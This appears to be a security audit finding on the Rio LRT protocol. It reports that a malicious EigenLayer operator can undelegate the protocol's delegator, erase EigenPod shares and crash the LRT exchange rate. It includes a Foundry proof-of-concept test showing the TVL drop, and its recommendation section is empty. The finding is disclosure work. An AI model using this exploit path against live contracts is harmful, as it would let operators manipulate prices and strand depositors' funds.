Obedient Carbon Leopard

high

# Malicious operators can `undelegate` theirselves to manipulate the LRT exchange rate

## Summary
If a malicious operator undelegates itself in EigenLayer delegation manager contract, the exchange rate of LRT can significantly decrease, and ETH/LST can become stuck, unable to be claimed by the Rio Delegator Approver contract.
## Vulnerability Detail
Operators' delegator contracts delegate their balance to the operators. Operators can "undelegate" themselves from any delegation forwarded to them by triggering this function:
[DelegationManager.sol#L211-L258](https://github.com/Layr-Labs/eigenlayer-contracts/blob/6de01c6c16d6df44af15f0b06809dc160eac0ebf/src/contracts/core/DelegationManager.sol#L211-L258).

If the operator `undelegate` the delegator approver, then according to the strategy, there can be two things that happen:

1- Strategy shares:
When the operator undelegates, the strategy shares delegated to the operator will be queued for withdrawal to the stakee address. In this case, the `staker` is the RIO operator delegator contract, which has no implementation to withdraw the queued withdrawal request since the withdrawer must be the "msg.sender." Therefore, the operator delegator must implement that functionality in such cases. The only downside to this is that the accounting of strategy shares to operators is tracked internally and not relied upon the StrategyManager's actual shares in the EigenLayer contract.

2- EigenPod shares:
When EigenPod shares are `undelegate`, the EigenPod shares are removed. Unlike the strategy shares, the EigenPod shares are used to account for how much ETH is held by each operator. If an operator `undelegate`, then the entire EigenPod balance will be "0," and the RIO contracts are not prepared for this. This will erase a large amount of ETH TVL held by the Beacon Chain strategy, hence the LRT token exchange rate will change dramatically. Also, as with the above strategy shares issue, the `staker` is the operator delegator; hence, the operator delegator must implement the withdrawal functionality to be able to withdraw the ETH balance from the EigenPod.
## Impact
High because of the "EigenPod shares" issue can unexpectedly decrease the TVL, leading to a decrease in the LRT exchange rate without warning which would affect the deposits/withdrawals of the LRT in different assets aswell. 

**Coded PoC:**
```solidity
// forge test --match-contract RioLRTOperatorRegistryTest --match-test test_UndelegateRemovesEigenPodShares -vv
    function test_UndelegateRemovesEigenPodShares() public {
        uint8 operatorId =
            addOperatorDelegator(reETH.operatorRegistry, address(reETH.rewardDistributor), emptyStrategyShareCaps, 10);
        
        // @review make a deposit
        reETH.coordinator.depositETH{value: 32 * 5 ether}();

        // Push funds into EigenLayer.
        vm.prank(EOA, EOA);
        reETH.coordinator.rebalance(ETH_ADDRESS);

        // Verify validator withdrawal credentials.
        uint40[] memory validatorIndices = verifyCredentialsForValidators(reETH.operatorRegistry, operatorId, 5);

        // @review get the addresses 
        address operatorDelegator = reETH.operatorRegistry.getOperatorDetails(operatorId).delegator;
        RioLRTOperatorDelegator delegatorContract = RioLRTOperatorDelegator(payable(operatorDelegator));

        // @review all ether is in eigen pod shares 
        assertEq(uint256(delegatorContract.getEigenPodShares()), 32 * 5 * 1e18);
        // @review the TVL is the 32*5 ether and the initial deposit
        assertEq(reETH.assetRegistry.getTVLForAsset(ETH_ADDRESS), 160010000000000000000);

        // @review undelegate from the operator 
        vm.prank(address(uint160(0 + 1)));
        delegationManager.undelegate(operatorDelegator);

        // @review eigenpod shares are removed fully
        assertEq(uint256(delegatorContract.getEigenPodShares()), 0);
        // @review the TVL is only the initial deposit
        assertEq(reETH.assetRegistry.getTVLForAsset(ETH_ADDRESS), 10000000000000000);
    }
```
## Code Snippet
https://github.com/Layr-Labs/eigenlayer-contracts/blob/6de01c6c16d6df44af15f0b06809dc160eac0ebf/src/contracts/core/DelegationManager.sol#L211-L258

## Tool used

Manual Review

## Recommendation
